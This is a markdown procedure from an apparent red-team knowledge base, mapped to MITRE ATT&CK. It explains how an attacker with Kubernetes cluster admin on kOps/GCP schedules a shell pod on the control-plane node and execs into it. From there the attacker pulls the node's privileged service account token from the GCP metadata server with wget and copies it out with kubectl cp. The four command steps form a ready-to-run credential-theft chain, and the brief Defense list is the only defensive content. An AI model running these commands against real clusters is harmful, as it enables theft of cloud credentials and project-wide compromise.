---
id: proc-6
name: Deploy-Pod-on-Master-and-Retrieve-Privileged-Token
tags:
  - kubernetes
  - gcp
  - lateral-movement
type: procedure
tools:
  - '[[tools/kubectl]]'
  - '[[tools/wget]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/kubectl-apply-shell-master]]'
  - '[[commands/kubectl-exec-master-ash]]'
  - '[[commands/wget-metadata-admin-token]]'
  - '[[commands/kubectl-cp-admin-token]]'
verified: false
platforms:
  - Kubernetes
  - GCP
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[T1078.004]]'
updated_at: '2025-12-14T17:30:18.564Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[T1078.004]]'
---
# Deploy-Pod-on-Master-and-Retrieve-Privileged-Token

## Summary

With cluster admin, deploys a shell pod on the control-plane node to access its more privileged GCP service account token.

## Description

Control-plane nodes in kOps on GCP use a service account with broader roles (e.g., Kubernetes Engine Service Agent). This procedure schedules a pod on the master, execs in, and steals the token for project-level access.

## Requirements

1. Cluster admin kubeconfig
2. shell-master.yaml (with nodeSelector for master)
3. Master node name known

## Defense

- Taint masters to prevent workloads
- Use separate service accounts for control-plane
- Monitor pod scheduling on masters

## Objectives

1. Run pod on privileged node
2. Steal admin token from metadata
3. Transfer for GCP abuse

## Instructions

### Step 1: Deploy Pod on Master

**Context**: Apply manifest targeting master node.

**Command** ([[commands/kubectl-apply-shell-master]]):
```bash
k apply -f shell-master.yaml
```

> Deploys on master. Expected output: Pod created.

### Step 2: Exec into Master Pod

**Context**: Gain shell on master pod.

**Command** ([[commands/kubectl-exec-master-ash]]):
```bash
k exec -it shell-78d66f6f7c-ft7ch -- ash
```

> Shell prompt. Expected output: ash in pod.

### Step 3: Fetch Privileged Token

**Context**: Query metadata for admin token.

**Command** ([[commands/wget-metadata-admin-token]]):
```bash
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
```

> Saves token. Expected output: admin.token JSON.

### Step 4: Copy Token to Host

**Context**: Transfer from pod.

**Command** ([[commands/kubectl-cp-admin-token]]):
```bash
k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
```

> Copies file. Expected output: Local admin.token.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Cloud Instance Metadata API]] Unsecured Credentials: Cloud Instance Metadata API
- [[T1078.004]] Valid Accounts: Cloud Accounts

### Sub-Techniques

- None

## Commands Used

- [[commands/kubectl-apply-shell-master]]
- [[commands/kubectl-exec-master-ash]]
- [[commands/wget-metadata-admin-token]]
- [[commands/kubectl-cp-admin-token]]

## Tools Used

- [[tools/kubectl]]
- [[tools/wget]]

## Tags

- kubernetes
- gcp
- lateral-movement
